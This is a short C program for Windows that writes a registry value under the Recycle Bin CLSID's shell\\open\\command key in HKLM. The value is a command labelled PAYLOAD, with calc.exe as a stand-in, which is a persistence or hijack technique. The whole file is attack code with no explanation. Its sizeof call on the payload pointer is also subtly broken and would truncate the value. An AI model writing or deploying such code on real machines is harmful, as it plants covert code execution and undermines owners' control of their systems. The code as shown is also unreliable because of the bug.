#include <windows.h>
#include <stdio.h>

int persistencia() {
    LPCSTR REGKEY1 = "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell";
    LPCSTR REGKEY2 = "open\\command";
    LPCSTR PAYLOAD = "calc.exe";

    HKEY hKey, hkR;
    DWORD res, lpdwDisposition;

    res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGKEY1, 0, KEY_ALL_ACCESS, &hKey);
    if (res == ERROR_SUCCESS) {
        res = RegCreateKeyExA(hKey, REGKEY2, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkR, &lpdwDisposition);
        if (res == ERROR_SUCCESS) {
            res = RegSetValueExA(hkR, NULL, 0, REG_SZ, (BYTE *)PAYLOAD, sizeof(PAYLOAD));
            if (res == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                RegCloseKey(hkR);
                return 0;
            }
            RegCloseKey(hkR);
        }
        RegCloseKey(hKey);
    }
    return -1;
}

int main() {
    return persistencia() != 0 ? -1 : 0;
}
